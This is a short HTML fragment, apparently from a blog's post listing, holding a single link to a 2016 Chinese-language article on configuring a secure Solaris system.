-            <a href="/2016/01/05/solaris/">教你如何配置安全的SOLARIS系统</a>
           </li>
         
       </ul>
